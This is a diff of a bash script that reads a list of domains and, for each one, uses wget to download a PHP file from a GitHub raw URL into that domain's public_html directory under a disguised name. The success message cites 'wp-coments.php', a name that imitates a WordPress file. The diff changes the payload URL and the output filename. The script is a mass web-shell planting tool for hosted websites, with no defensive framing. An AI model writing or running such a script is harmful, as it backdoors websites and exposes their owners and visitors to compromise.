@@ -14,10 +14,10 @@ echo "====================================="
 read -p "Input File: " lis;
 read -p "Path: " pat;
 while read line; do
-c=$(cd /home/qtannet/domains/${line}/public_html/ && wget -q https://raw.githubusercontent.com/sandanisa/ty/main/ty.php -O sandni.php)
+c=$(cd /home/qtannet/domains/${line}/public_html/ && wget -q https://raw.githubusercontent.com/sandanisa/oke/main/pu.php -O uup.php)
 if [[ $c ]];
 then
-echo -e "${nat}[${ijo}Succes${nat}] ${line}/wp-coments.php"
+echo -e "${nat}[${ijo}Succes${nat}] ${line}/uup.php"
 else
 echo -e "${nat}[${ijo}Succes${nat}] ${line}/wp-coments.php"
 fi
